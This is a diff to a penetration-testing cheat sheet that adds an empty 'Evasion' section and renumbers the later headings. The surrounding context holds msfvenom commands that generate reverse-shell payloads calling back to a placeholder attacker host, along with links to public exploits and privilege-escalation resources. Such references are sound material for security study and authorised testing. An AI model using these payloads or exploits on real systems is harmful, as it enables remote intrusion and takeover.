@@ -11,10 +11,11 @@ Overview
 7. - [File Transfers](#7---file-transfers)
 8. - [Restricted Shell Escapes](#8---restricted-shell-escapes)
 9. - [Shells](#9---shells)
-10. - [Online Resources](#10---online-resources)
-11. - [Browser Plugins](#11---browser-plugins)
-12. - [Exploits](#12---exploits)
-13. - [Exploit Research](#13---exploit-research)
+10. - [Evasion](#10---evasion)
+11. - [Online Resources](#11---online-resources)
+12. - [Browser Plugins](#12---browser-plugins)
+13. - [Exploits](#13---exploits)
+14. - [Exploit Research](#14---exploit-research)
    
 #1. - Passive Enumeration
 -----------------------------------------
@@ -1318,7 +1319,10 @@ $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f war 
 $ msfvenom -p windows/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f exe -o shell.exe
 ```
 
-#10. - Online Resources
+#10. - Evasion
+-----------------------------------------
+
+#11. - Online Resources
 -----------------------------------------
 
 - Speedguide
@@ -1345,7 +1349,7 @@ https://lolbas-project.github.io/
 https://gtfobins.github.io/
 ```
 
-#11. - Browser Plugins
+#12. - Browser Plugins
 -----------------------------------------
 
 - Wappalyzer: Website technology analyser
@@ -1366,7 +1370,7 @@ https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/
 https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
 ```
 
-#12. - Exploits
+#13. - Exploits
 -----------------------------------------
 
 - MS17-010
@@ -1402,7 +1406,7 @@ https://github.com/flast101/php-8.1.0-dev-backdoor-rce
 https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py
 ```
 
-#13. - Exploit Research
+#14. - Exploit Research
 -----------------------------------------
 
 - CVEdetails
